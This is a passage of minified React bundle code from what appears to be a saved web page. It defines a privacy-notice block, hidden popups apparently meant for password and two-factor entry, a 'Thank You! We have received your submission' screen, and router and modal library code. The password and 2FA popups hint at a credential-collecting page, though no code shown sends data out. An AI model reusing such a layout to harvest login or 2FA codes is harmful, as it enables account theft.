                                                                d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                fill: "black"
                                                            })
                                                        })
                                                    })]
                                                })]
                                            }), (0,
                                            he.jsx)("br", {}), (0,
                                            he.jsx)("p", {
                                                className: "small-grey",
                                                children: "We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about"
                                            }), (0,
                                            he.jsxs)("div", {
                                                className: "link-to",
                                                children: ["Privacy Policy", (0,
                                                he.jsxs)("svg", {
                                                    width: 12,
                                                    height: 12,
                                                    viewBox: "0 0 12 12",
                                                    fill: "none",
                                                    xmlns: "http://www.w3.org/2000/svg",
                                                    children: [(0,
                                                    he.jsx)("path", {
                                                        d: "M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z",
                                                        fill: "black"
                                                    }), (0,
                                                    he.jsx)("path", {
                                                        d: "M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z",
                                                        fill: "black"
                                                    })]
                                                })]
                                            }), (0,
                                            he.jsx)("p", {})]
                                        })
                                    }), (0,
                                    he.jsxs)("div", {
                                        className: "popup",
                                        children: [(0,
                                        he.jsx)("div", {
                                            className: "popup-item popup-menu sf-hidden"
                                        }), (0,
                                        he.jsx)("div", {
                                            className: "popup-item popup-menu sf-hidden"
                                        }), (0,
                                        he.jsx)("div", {
                                            className: "popup-item popup-modal sf-hidden"
                                        }), (0,
                                        he.jsx)("div", {
                                            className: "popup-item popup-pasword sf-hidden"
                                        }), (0,
                                        he.jsx)("div", {
                                            className: "popup-item popup-two-fa sf-hidden"
                                        }), (0,
                                        he.jsx)("div", {
                                            className: "popup-item popup-two-fa sf-hidden"
                                        })]
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        }
        ;
        function xe() {
            return xe = Object.assign ? Object.assign.bind() : function(e) {
                for (var n = 1; n < arguments.length; n++) {
                    var t = arguments[n];
                    for (var r in t)
                        Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r])
                }
                return e
            }
            ,
            xe.apply(this, arguments)
        }
        function we(e, n) {
            if (null == e)
                return {};
            var t, r, a = {}, i = Object.keys(e);
            for (r = 0; r < i.length; r++)
                t = i[r],
                n.indexOf(t) >= 0 || (a[t] = e[t]);
            return a
        }
        new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
        const ye = ["onClick", "relative", "reloadDocument", "replace", "state", "target", "to", "preventScrollReset", "unstable_viewTransition"];
        try {
            window.__reactRouterVersion = "6"
        } catch (St) {}
        new Map;
        const Ce = r.startTransition;
        i.flushSync,
        r.useId;
        function Ee(e) {
            let {basename: t, children: r, future: a, window: i} = e
              , l = n.useRef();
            null == l.current && (l.current = function(e) {
                return void 0 === e && (e = {}),
                p((function(e, n) {
                    let {pathname: t, search: r, hash: a} = e.location;
                    return A("", {
                        pathname: t,
                        search: r,
                        hash: a
                    }, n.state && n.state.usr || null, n.state && n.state.key || "default")
                }
                ), (function(e, n) {
                    return "string" === typeof n ? n : d(n)
                }
                ), null, e)
            }({
                window: i,
                v5Compat: !0
            }));
            let o = l.current
              , [s,u] = n.useState({
                action: o.action,
                location: o.location
            })
              , {v7_startTransition: c} = a || {}
              , f = n.useCallback((e => {
                c && Ce ? Ce(( () => u(e))) : u(e)
            }
            ), [u, c]);
            return n.useLayoutEffect(( () => o.listen(f)), [o, f]),
            n.createElement(fe, {
                basename: t,
                children: r,
                location: s.location,
                navigationType: s.action,
                navigator: o,
                future: a
            })
        }
        const je = "undefined" !== typeof window && "undefined" !== typeof window.document && "undefined" !== typeof window.document.createElement
          , ze = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
          , Pe = n.forwardRef((function(e, t) {
            let r, {onClick: a, relative: i, reloadDocument: l, replace: o, state: u, target: c, to: A, preventScrollReset: f, unstable_viewTransition: p} = e, v = we(e, ye), {basename: m} = n.useContext(F), h = !1;
            if ("string" === typeof A && ze.test(A) && (r = A,
            je))
                try {
                    let e = new URL(window.location.href)
                      , n = A.startsWith("//") ? new URL(e.protocol + A) : new URL(A)
                      , t = X(n.pathname, m);
                    n.origin === e.origin && null != t ? A = t + n.search + n.hash : h = !0
                } catch (St) {}
            let b = function(e, t) {
                let {relative: r} = void 0 === t ? {} : t;
                U() || s(!1);
                let {basename: a, navigator: i} = n.useContext(F)
                  , {hash: l, pathname: o, search: u} = $(e, {
                    relative: r
                })
                  , c = o;
                return "/" !== a && (c = "/" === o ? a : R([a, o])),
                i.createHref({
                    pathname: c,
                    search: u,
                    hash: l
                })
            }(A, {
                relative: i
            })
              , g = function(e, t) {
                let {target: r, replace: a, state: i, preventScrollReset: l, relative: o, unstable_viewTransition: s} = void 0 === t ? {} : t
                  , u = _()
                  , c = J()
                  , A = $(e, {
                    relative: o
                });
                return n.useCallback((n => {
                    if (function(e, n) {
                        return 0 === e.button && (!n || "_self" === n) && !function(e) {
                            return !!(e.metaKey || e.altKey || e.ctrlKey || e.shiftKey)
                        }(e)
                    }(n, r)) {
                        n.preventDefault();
                        let t = void 0 !== a ? a : d(c) === d(A);
                        u(e, {
                            replace: t,
                            state: i,
                            preventScrollReset: l,
                            relative: o,
                            unstable_viewTransition: s
                        })
                    }
                }
                ), [c, u, A, a, i, r, e, l, o, s])
            }(A, {
                replace: o,
                state: u,
                target: c,
                preventScrollReset: f,
                relative: i,
                unstable_viewTransition: p
            });
            return n.createElement("a", xe({}, v, {
                href: r || b,
                onClick: h || l ? a : function(e) {
                    a && a(e),
                    e.defaultPrevented || g(e)
                }
                ,
                ref: t,
                target: c
            }))
        }
        ));
        var Ne, Ie;
        (function(e) {
            e.UseScrollRestoration = "useScrollRestoration",
            e.UseSubmit = "useSubmit",
            e.UseSubmitFetcher = "useSubmitFetcher",
            e.UseFetcher = "useFetcher",
            e.useViewTransitionState = "useViewTransitionState"
        }
        )(Ne || (Ne = {})),
        function(e) {
            e.UseFetcher = "useFetcher",
            e.UseFetchers = "useFetchers",
            e.UseScrollRestoration = "useScrollRestoration"
        }(Ie || (Ie = {}));
        const Xe = t.p + "static/media/thankstop.f19d77694f7b29c84dc8.png";
        var Le = {
            color: void 0,
            size: void 0,
            className: void 0,
            style: void 0,
            attr: void 0
        }
          , Oe = n.createContext && n.createContext(Le)
          , Be = ["attr", "size", "title"];
        function Te(e, n) {
            if (null == e)
                return {};
            var t, r, a = function(e, n) {
                if (null == e)
                    return {};
                var t, r, a = {}, i = Object.keys(e);
                for (r = 0; r < i.length; r++)
                    t = i[r],
                    n.indexOf(t) >= 0 || (a[t] = e[t]);
                return a
            }(e, n);
            if (Object.getOwnPropertySymbols) {
                var i = Object.getOwnPropertySymbols(e);
                for (r = 0; r < i.length; r++)
                    t = i[r],
                    n.indexOf(t) >= 0 || Object.prototype.propertyIsEnumerable.call(e, t) && (a[t] = e[t])
            }
            return a
        }
        function Re() {
            return Re = Object.assign ? Object.assign.bind() : function(e) {
                for (var n = 1; n < arguments.length; n++) {
                    var t = arguments[n];
                    for (var r in t)
                        Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r])
                }
                return e
            }
            ,
            Re.apply(this, arguments)
        }
        function Me(e, n) {
            var t = Object.keys(e);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(e);
                n && (r = r.filter((function(n) {
                    return Object.getOwnPropertyDescriptor(e, n).enumerable
                }
                ))),
                t.push.apply(t, r)
            }
            return t
        }
        function He(e) {
            for (var n = 1; n < arguments.length; n++) {
                var t = null != arguments[n] ? arguments[n] : {};
                n % 2 ? Me(Object(t), !0).forEach((function(n) {
                    We(e, n, t[n])
                }
                )) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : Me(Object(t)).forEach((function(n) {
                    Object.defineProperty(e, n, Object.getOwnPropertyDescriptor(t, n))
                }
                ))
            }
            return e
        }
        function We(e, n, t) {
            return (n = function(e) {
                var n = function(e, n) {
                    if ("object" !== typeof e || null === e)
                        return e;
                    var t = e[Symbol.toPrimitive];
                    if (void 0 !== t) {
                        var r = t.call(e, n || "default");
                        if ("object" !== typeof r)
                            return r;
                        throw new TypeError("@@toPrimitive must return a primitive value.")
                    }
                    return ("string" === n ? String : Number)(e)
                }(e, "string");
                return "symbol" === typeof n ? n : String(n)
            }(n))in e ? Object.defineProperty(e, n, {
                value: t,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[n] = t,
            e
        }
        function Ve(e) {
            return e && e.map(( (e, t) => n.createElement(e.tag, He({
                key: t
            }, e.attr), Ve(e.child))))
        }
        function ke(e) {
            return t => n.createElement(Ye, Re({
                attr: He({}, e.attr)
            }, t), Ve(e.child))
        }
        function Ye(e) {
            var t = t => {
                var r, {attr: a, size: i, title: l} = e, o = Te(e, Be), s = i || t.size || "1em";
                return t.className && (r = t.className),
                e.className && (r = (r ? r + " " : "") + e.className),
                n.createElement("svg", Re({
                    stroke: "currentColor",
                    fill: "currentColor",
                    strokeWidth: "0"
                }, t.attr, a, o, {
                    className: r,
                    style: He(He({
                        color: e.color || t.color
                    }, t.style), e.style),
                    height: s,
                    width: s,
                    xmlns: "http://www.w3.org/2000/svg"
                }), l && n.createElement("title", null, l), e.children)
            }
            ;
            return void 0 !== Oe ? n.createElement(Oe.Consumer, null, (e => t(e))) : t(Le)
        }
        function Se(e) {
            return ke({
                tag: "svg",
                attr: {
                    version: "1.2",
                    baseProfile: "tiny",
                    viewBox: "0 0 24 24"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M11 20c-.801 0-1.555-.312-2.121-.879l-4-4c-.567-.566-.879-1.32-.879-2.121s.312-1.555.879-2.122c1.133-1.133 3.109-1.133 4.242 0l1.188 1.188 3.069-5.523c.526-.952 1.533-1.544 2.624-1.544.507 0 1.012.131 1.456.378.7.39 1.206 1.028 1.427 1.798.221.771.127 1.581-.263 2.282l-5 9c-.454.818-1.279 1.384-2.206 1.514-.139.019-.277.029-.416.029zm-4-8c-.268 0-.518.104-.707.293s-.293.439-.293.707.104.518.293.707l4 4c.223.221.523.33.844.283.312-.043.586-.232.737-.504l5-9c.13-.233.161-.503.088-.76-.073-.257-.243-.47-.478-.6-.473-.264-1.101-.078-1.357.388l-4.357 7.841-3.062-3.062c-.19-.189-.44-.293-.708-.293z"
                    },
                    child: []
                }]
            })(e)
        }
        const Ze = () => (0,
        he.jsx)("div", {
            className: "d-flex justify-content-center align-items-center",
            style: {
                width: "100%",
                height: "100vh"
            },
            children: (0,
            he.jsxs)("div", {
                className: "position-relative",
                children: [(0,
                he.jsx)("img", {
                    src: Xe,
                    alt: "top",
                    className: "position-absolute",
                    style: {
                        width: "10rem",
                        top: "-80px",
                        right: "-80px",
                        zIndex: 0
                    }
                }), (0,
                he.jsx)("img", {
                    src: Xe,
                    alt: "top",
                    className: "position-absolute",
                    style: {
                        width: "10rem",
                        bottom: "-80px",
                        left: "-80px",
                        transform: "rotate(190deg)",
                        zIndex: 0
                    }
                }), (0,
                he.jsxs)("div", {
                    className: "d-flex flex-column justify-content-center align-items-center p-4 rounded position-relative",
                    style: {
                        height: "400px",
                        background: "white",
                        border: "20px",
                        boxShadow: "0px 0px 10px rgba(0, 0, 0, 0.1)",
                        zIndex: 1
                    },
                    children: [(0,
                    he.jsx)("div", {
                        className: "d-flex justify-content-center align-items-center",
                        style: {
                            width: "5rem",
                            height: "5rem",
                            borderRadius: "50%",
                            background: "rgb(243, 245, 251)"
                        },
                        children: (0,
                        he.jsx)(Se, {
                            className: "fs-1"
                        })
                    }), (0,
                    he.jsx)("h2", {
                        className: "mt-4",
                        children: "Thank You!"
                    }), (0,
                    he.jsx)("p", {
                        className: "my-4 text-center",
                        style: {
                            color: "gray",
                            fontSize: "22px",
                            fontWeight: "600"
                        },
                        children: "We have received your submission"
                    }), (0,
                    he.jsx)(Pe, {
                        to: "/",
                        className: "px-4 p-2 mt-4 border rounded text-white",
                        style: {
                            background: "rgb(14, 11, 61)",
                            textDecoration: "none"
                        },
                        children: "Return"
                    })]
                })]
            })
        });
        var De = t(856)
          , Fe = t.n(De);
        const Ge = !("undefined" === typeof window || !window.document || !window.document.createElement);
        var Qe = !1
          , qe = !1;
        try {
            var Ue = {
                get passive() {
                    return Qe = !0
                },
                get once() {
                    return qe = Qe = !0
                }
            };
            Ge && (window.addEventListener("test", Ue, Ue),
            window.removeEventListener("test", Ue, !0))
        } catch (St) {}
        const Je = function(e, n, t, r) {
            if (r && "boolean" !== typeof r && !qe) {
                var a = r.once
                  , i = r.capture
                  , l = t;
                !qe && a && (l = t.__once || function e(r) {
                    this.removeEventListener(n, e, i),
                    t.call(this, r)
                }
                ,
                t.__once = l),
                e.addEventListener(n, l, Qe ? r : i)
            }
            e.addEventListener(n, t, r)
        };
        function Ke(e) {
            return e && e.ownerDocument || document
        }
        const _e = function(e, n, t, r) {
            var a = r && "boolean" !== typeof r ? r.capture : r;
            e.removeEventListener(n, t, a),
            t.__once && e.removeEventListener(n, t.__once, a)
        };
        var $e;
        function en(e) {
            if ((!$e && 0 !== $e || e) && Ge) {
                var n = document.createElement("div");
                n.style.position = "absolute",
                n.style.top = "-9999px",
                n.style.width = "50px",
                n.style.height = "50px",
                n.style.overflow = "scroll",
                document.body.appendChild(n),
                $e = n.offsetWidth - n.clientWidth,
                document.body.removeChild(n)
            }
            return $e
        }
        const nn = function(e) {
            const t = (0,
            n.useRef)(e);
            return (0,
            n.useEffect)(( () => {
                t.current = e
            }
            ), [e]),
            t
        };
        function tn(e) {
            const t = nn(e);
            return (0,
            n.useCallback)((function() {
                return t.current && t.current(...arguments)
            }
            ), [t])
        }
        const rn = e => e && "function" !== typeof e ? n => {
            e.current = n
        }
        : e;
        const an = function(e, t) {
            return (0,
            n.useMemo)(( () => function(e, n) {
                const t = rn(e)
                  , r = rn(n);
                return e => {
                    t && t(e),
                    r && r(e)
                }
            }(e, t)), [e, t])
        };
        function ln(e) {
            const t = function(e) {
                const t = (0,
                n.useRef)(e);
                return t.current = e,
                t
            }(e);
            (0,
            n.useEffect)(( () => () => t.current()), [])
        }
        function on(e, n) {
            return function(e) {
                var n = Ke(e);
                return n && n.defaultView || window
            }(e).getComputedStyle(e, n)
        }
        var sn = /([A-Z])/g;
        var un = /^ms-/;
        function cn(e) {
            return function(e) {
                return e.replace(sn, "-$1").toLowerCase()
            }(e).replace(un, "-ms-")
        }
        var An = /^((translate|rotate|scale)(X|Y|Z|3d)?|matrix(3d)?|perspective|skew(X|Y)?)$/i;
        const dn = function(e, n) {
            var t = ""
              , r = "";
            if ("string" === typeof n)
                return e.style.getPropertyValue(cn(n)) || on(e).getPropertyValue(cn(n));
            Object.keys(n).forEach((function(a) {
                var i = n[a];
                i || 0 === i ? !function(e) {
                    return !(!e || !An.test(e))
                }(a) ? t += cn(a) + ": " + i + ";" : r += a + "(" + i + ") " : e.style.removeProperty(cn(a))
            }
            )),
            r && (t += "transform: " + r + ";"),
            e.style.cssText += ";" + t
        };
        const fn = function(e, n, t, r) {
            return Je(e, n, t, r),
            function() {
                _e(e, n, t, r)
            }
        };
        function pn(e, n, t) {
            void 0 === t && (t = 5);
            var r = !1
              , a = setTimeout((function() {
                r || function(e, n, t, r) {
                    if (void 0 === t && (t = !1),
                    void 0 === r && (r = !0),
                    e) {
                        var a = document.createEvent("HTMLEvents");
                        a.initEvent(n, t, r),
                        e.dispatchEvent(a)
                    }
                }(e, "transitionend", !0)
            }
            ), n + t)
              , i = fn(e, "transitionend", (function() {
                r = !0
            }
            ), {
                once: !0
            });
            return function() {
                clearTimeout(a),
                i()
            }
        }
        function vn(e, n, t, r) {
            null == t && (t = function(e) {
                var n = dn(e, "transitionDuration") || ""
                  , t = -1 === n.indexOf("ms") ? 1e3 : 1;
                return parseFloat(n) * t
            }(e) || 0);
            var a = pn(e, t, r)
              , i = fn(e, "transitionend", n);
            return function() {
                a(),
                i()
            }
        }
        function mn(e) {
            void 0 === e && (e = Ke());
            try {
                var n = e.activeElement;
                return n && n.nodeName ? n : null
            } catch (St) {
                return e.body
            }
        }
        function hn(e, n) {
            return e.contains ? e.contains(n) : e.compareDocumentPosition ? e === n || !!(16 & e.compareDocumentPosition(n)) : void 0
        }
        const bn = `data-rr-ui-${"modal-open"}`;
        const gn = class {
            constructor() {
                let {ownerDocument: e, handleContainerOverflow: n=!0, isRTL: t=!1} = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                this.handleContainerOverflow = n,
                this.isRTL = t,
                this.modals = [],
                this.ownerDocument = e
            }
            getScrollbarWidth() {
                return function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : document;
                    const n = e.defaultView;
                    return Math.abs(n.innerWidth - e.documentElement.clientWidth)
                }(this.ownerDocument)
            }
            getElement() {
                return (this.ownerDocument || document).body
            }
            setModalAttributes(e) {}
            removeModalAttributes(e) {}
            setContainerStyle(e) {
                const n = {
                    overflow: "hidden"
                }
                  , t = this.isRTL ? "paddingLeft" : "paddingRight"
                  , r = this.getElement();
                e.style = {
                    overflow: r.style.overflow,
                    [t]: r.style[t]
                },
                e.scrollBarWidth && (n[t] = `${parseInt(dn(r, t) || "0", 10) + e.scrollBarWidth}px`),
                r.setAttribute(bn, ""),
                dn(r, n)
            }
            reset() {
                [...this.modals].forEach((e => this.remove(e)))
            }
            removeContainerStyle(e) {
                const n = this.getElement();
                n.removeAttribute(bn),
                Object.assign(n.style, e.style)
            }
            add(e) {
                let n = this.modals.indexOf(e);
                return -1 !== n ? n : (n = this.modals.length,
                this.modals.push(e),
                this.setModalAttributes(e),
                0 !== n || (this.state = {
                    scrollBarWidth: this.getScrollbarWidth(),
                    style: {}
                },
                this.handleContainerOverflow && this.setContainerStyle(this.state)),
                n)
            }
            remove(e) {
                const n = this.modals.indexOf(e);
                -1 !== n && (this.modals.splice(n, 1),
                !this.modals.length && this.handleContainerOverflow && this.removeContainerStyle(this.state),
                this.removeModalAttributes(e))
            }
            isTopModal(e) {
                return !!this.modals.length && this.modals[this.modals.length - 1] === e
            }
        }
          , xn = (0,
        n.createContext)(Ge ? window : void 0);
        xn.Provider;
        function wn() {
            return (0,
            n.useContext)(xn)
        }
        const yn = (e, n) => Ge ? null == e ? (n || Ke()).body : ("function" === typeof e && (e = e()),
        e && "current"in e && (e = e.current),
        e && ("nodeType"in e || e.getBoundingClientRect) ? e : null) : null;
        const Cn = "undefined" !== typeof t.g && t.g.navigator && "ReactNative" === t.g.navigator.product
          , En = "undefined" !== typeof document || Cn ? n.useLayoutEffect : n.useEffect;
        const jn = function(e) {
            let {children: t, in: r, onExited: a, mountOnEnter: i, unmountOnExit: l} = e;
            const o = (0,
            n.useRef)(null)
              , s = (0,
            n.useRef)(r)
              , u = tn(a);
            (0,
            n.useEffect)(( () => {
                r ? s.current = !0 : u(o.current)
            }
            ), [r, u]);
            const c = an(o, t.ref)
              , A = (0,
            n.cloneElement)(t, {
                ref: c
            });
            return r ? A : l || !s.current && i ? null : A
        }
          , zn = ["onEnter", "onEntering", "onEntered", "onExit", "onExiting", "onExited", "addEndListener", "children"];
        function Pn(e) {
            let {onEnter: t, onEntering: r, onEntered: a, onExit: i, onExiting: l, onExited: o, addEndListener: s, children: u} = e
              , c = function(e, n) {
                if (null == e)
                    return {};
                var t, r, a = {}, i = Object.keys(e);
                for (r = 0; r < i.length; r++)
                    t = i[r],
                    n.indexOf(t) >= 0 || (a[t] = e[t]);
                return a
            }(e, zn);
            const A = (0,
            n.useRef)(null)
              , d = an(A, "function" === typeof u ? null : u.ref)
              , f = e => n => {
                e && A.current && e(A.current, n)
            }
              , p = (0,
            n.useCallback)(f(t), [t])
              , v = (0,
            n.useCallback)(f(r), [r])
              , m = (0,
            n.useCallback)(f(a), [a])
              , h = (0,
            n.useCallback)(f(i), [i])
              , b = (0,
            n.useCallback)(f(l), [l])
              , g = (0,
            n.useCallback)(f(o), [o])
              , x = (0,
            n.useCallback)(f(s), [s]);
            return Object.assign({}, c, {
                nodeRef: A
            }, t && {
                onEnter: p
            }, r && {
                onEntering: v
            }, a && {
                onEntered: m
            }, i && {
                onExit: h
            }, l && {
                onExiting: b
            }, o && {
                onExited: g
            }, s && {
                addEndListener: x
            }, {
                children: "function" === typeof u ? (e, n) => u(e, Object.assign({}, n, {
                    ref: d
                })) : (0,
                n.cloneElement)(u, {
                    ref: d
                })
            })
        }
        const Nn = ["component"];
        const In = n.forwardRef(( (e, n) => {
            let {component: t} = e;
            const r = Pn(function(e, n) {
                if (null == e)
                    return {};
                var t, r, a = {}, i = Object.keys(e);
                for (r = 0; r < i.length; r++)
                    t = i[r],
                    n.indexOf(t) >= 0 || (a[t] = e[t]);
                return a
            }(e, Nn));
            return (0,
            he.jsx)(t, Object.assign({
                ref: n
            }, r))
        }
        ));
        function Xn(e) {
            let {children: t, in: r, onExited: a, onEntered: i, transition: l} = e;
            const [o,s] = (0,
            n.useState)(!r);
            r && o && s(!1);
            const u = function(e) {
                let {in: t, onTransition: r} = e;
                const a = (0,
                n.useRef)(null)
                  , i = (0,
                n.useRef)(!0)
                  , l = tn(r);
                return En(( () => {
                    if (!a.current)
                        return;
                    let e = !1;
                    return l({
                        in: t,
                        element: a.current,
                        initial: i.current,
                        isStale: () => e
                    }),
                    () => {
                        e = !0
                    }
                }
                ), [t, l]),
                En(( () => (i.current = !1,
                () => {
                    i.current = !0
                }
                )), []),
                a
            }({
                in: !!r,
                onTransition: e => {
                    Promise.resolve(l(e)).then(( () => {
                        e.isStale() || (e.in ? null == i || i(e.element, e.initial) : (s(!0),
                        null == a || a(e.element)))
                    }
                    ), (n => {
                        throw e.in || s(!0),
                        n
                    }
                    ))
                }
            })
              , c = an(u, t.ref);
            return o && !r ? null : (0,
            n.cloneElement)(t, {
                ref: c
            })
        }
        function Ln(e, n, t) {
            return e ? (0,
            he.jsx)(In, Object.assign({}, t, {
                component: e
            })) : n ? (0,
            he.jsx)(Xn, Object.assign({}, t, {
                transition: n
            })) : (0,
            he.jsx)(jn, Object.assign({}, t))
        }
        const On = ["show", "role", "className", "style", "children", "backdrop", "keyboard", "onBackdropClick", "onEscapeKeyDown", "transition", "runTransition", "backdropTransition", "runBackdropTransition", "autoFocus", "enforceFocus", "restoreFocus", "restoreFocusOptions", "renderDialog", "renderBackdrop", "manager", "container", "onShow", "onHide", "onExit", "onExited", "onExiting", "onEnter", "onEntering", "onEntered"];
        let Bn;
        function Tn(e) {
            const t = wn()
              , r = e || function(e) {
                return Bn || (Bn = new gn({
                    ownerDocument: null == e ? void 0 : e.document
                })),
                Bn
            }(t)
              , a = (0,
            n.useRef)({
                dialog: null,
                backdrop: null
            });
            return Object.assign(a.current, {
                add: () => r.add(a.current),
                remove: () => r.remove(a.current),
                isTopModal: () => r.isTopModal(a.current),
                setDialogRef: (0,
                n.useCallback)((e => {
                    a.current.dialog = e
                }
                ), []),
                setBackdropRef: (0,
                n.useCallback)((e => {
                    a.current.backdrop = e
                }
                ), [])
            })
        }
        const Rn = (0,
        n.forwardRef)(( (e, t) => {
            let {show: r=!1, role: i="dialog", className: l, style: o, children: s, backdrop: u=!0, keyboard: c=!0, onBackdropClick: A, onEscapeKeyDown: d, transition: f, runTransition: p, backdropTransition: v, runBackdropTransition: m, autoFocus: h=!0, enforceFocus: b=!0, restoreFocus: g=!0, restoreFocusOptions: x, renderDialog: w, renderBackdrop: y=(e => (0,
            he.jsx)("div", Object.assign({}, e))), manager: C, container: E, onShow: j, onHide: z=( () => {}
            ), onExit: P, onExited: N, onExiting: I, onEnter: X, onEntering: L, onEntered: O} = e
              , B = function(e, n) {
                if (null == e)
                    return {};
                var t, r, a = {}, i = Object.keys(e);
                for (r = 0; r < i.length; r++)
                    t = i[r],
                    n.indexOf(t) >= 0 || (a[t] = e[t]);
                return a
            }(e, On);
            const T = wn()
              , R = function(e, t) {
                const r = wn()
                  , [a,i] = (0,
                n.useState)(( () => yn(e, null == r ? void 0 : r.document)));
                if (!a) {
                    const n = yn(e);
                    n && i(n)
                }
                return (0,
                n.useEffect)(( () => {
                    t && a && t(a)
                }
                ), [t, a]),
                (0,
                n.useEffect)(( () => {
                    const n = yn(e);
                    n !== a && i(n)
                }
                ), [e, a]),
                a
            }(E)
              , M = Tn(C)
              , H = function() {
                const e = (0,
                n.useRef)(!0)
                  , t = (0,
                n.useRef)(( () => e.current));
                return (0,
                n.useEffect)(( () => (e.current = !0,
                () => {
                    e.current = !1
                }
                )), []),
                t.current
            }()
              , W = function(e) {
                const t = (0,
                n.useRef)(null);
                return (0,
                n.useEffect)(( () => {
                    t.current = e
                }
                )),
                t.current
            }(r)
              , [V,k] = (0,
            n.useState)(!r)
              , Y = (0,
            n.useRef)(null);
            (0,
            n.useImperativeHandle)(t, ( () => M), [M]),
            Ge && !W && r && (Y.current = mn(null == T ? void 0 : T.document)),
            r && V && k(!1);
            const S = tn(( () => {
                if (M.add(),
                q.current = fn(document, "keydown", G),
                Q.current = fn(document, "focus", ( () => setTimeout(D)), !0),
                j && j(),
                h) {
                    var e, n;
                    const t = mn(null != (e = null == (n = M.dialog) ? void 0 : n.ownerDocument) ? e : null == T ? void 0 : T.document);
                    M.dialog && t && !hn(M.dialog, t) && (Y.current = t,
                    M.dialog.focus())
                }
            }
            ))
              , Z = tn(( () => {
                var e;
                (M.remove(),
                null == q.current || q.current(),
                null == Q.current || Q.current(),
                g) && (null == (e = Y.current) || null == e.focus || e.focus(x),
                Y.current = null)
            }
            ));
            (0,
            n.useEffect)(( () => {
                r && R && S()
            }
            ), [r, R, S]),
            (0,
            n.useEffect)(( () => {
                V && Z()
            }
            ), [V, Z]),
            ln(( () => {
                Z()
            }
            ));
            const D = tn(( () => {
                if (!b || !H() || !M.isTopModal())
                    return;
                const e = mn(null == T ? void 0 : T.document);
                M.dialog && e && !hn(M.dialog, e) && M.dialog.focus()
            }
            ))
              , F = tn((e => {
                e.target === e.currentTarget && (null == A || A(e),
                !0 === u && z())
            }
            ))
              , G = tn((e => {
                c && function(e) {
                    return "Escape" === e.code || 27 === e.keyCode
                }(e) && M.isTopModal() && (null == d || d(e),
                e.defaultPrevented || z())
            }
            ))
              , Q = (0,
            n.useRef)()
              , q = (0,
            n.useRef)();
            if (!R)
                return null;
            const U = Object.assign({
                role: i,
                ref: M.setDialogRef,
                "aria-modal": "dialog" === i || void 0
            }, B, {
                style: o,
                className: l,
                tabIndex: -1
            });
            let J = w ? w(U) : (0,
            he.jsx)("div", Object.assign({}, U, {
                children: n.cloneElement(s, {
                    role: "document"
                })
            }));
            J = Ln(f, p, {
                unmountOnExit: !0,
                mountOnEnter: !0,
                appear: !0,
                in: !!r,
                onExit: P,
                onExiting: I,
                onExited: function() {
                    k(!0),
                    null == N || N(...arguments)
                },
                onEnter: X,
                onEntering: L,
                onEntered: O,
                children: J
            });
            let K = null;
            return u && (K = y({
                ref: M.setBackdropRef,
                onClick: F
            }),
            K = Ln(v, m, {
                in: !!r,
                appear: !0,
                mountOnEnter: !0,
                unmountOnExit: !0,
                children: K
            })),
            (0,
            he.jsx)(he.Fragment, {
                children: a.createPortal((0,
                he.jsxs)(he.Fragment, {
                    children: [K, J]
                }), R)
            })
        }
        ));
        Rn.displayName = "Modal";
        const Mn = Object.assign(Rn, {
            Manager: gn
        });
